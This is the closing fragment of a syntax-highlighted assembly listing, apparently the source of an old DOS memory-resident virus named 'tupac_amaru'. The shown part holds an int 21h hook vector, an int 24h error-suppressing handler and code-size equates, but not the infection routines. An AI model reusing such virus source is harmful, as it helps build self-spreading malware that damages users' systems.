</span><span class="sc5">int21jump</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">
</span><span class="sc5">int21h</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">in24</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc5">the24</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">

                </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">place_21</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">in21</span><span class="sc4">-</span><span class="sc5">tupac_start</span><span class="sc0">
</span><span class="sc5">place_ff</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">place_21</span><span class="sc4">/</span><span class="sc2">0100h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">place_24</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">in24</span><span class="sc4">-</span><span class="sc5">tupac_start</span><span class="sc0">
</span><span class="sc5">place_ff24</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">place_24</span><span class="sc4">/</span><span class="sc2">0100h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">tupac_end</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">tupac_size</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">tupac_end</span><span class="sc4">-</span><span class="sc5">tupac_start</span><span class="sc0">
</span><span class="sc5">tupac_parag</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">tupac_size</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc4">)+</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">tupac_ff</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">tupac_size</span><span class="sc4">/</span><span class="sc2">0100h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">kodigo</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">tupac_amaru</span><span class="sc0">
</span></div></body>
</html>
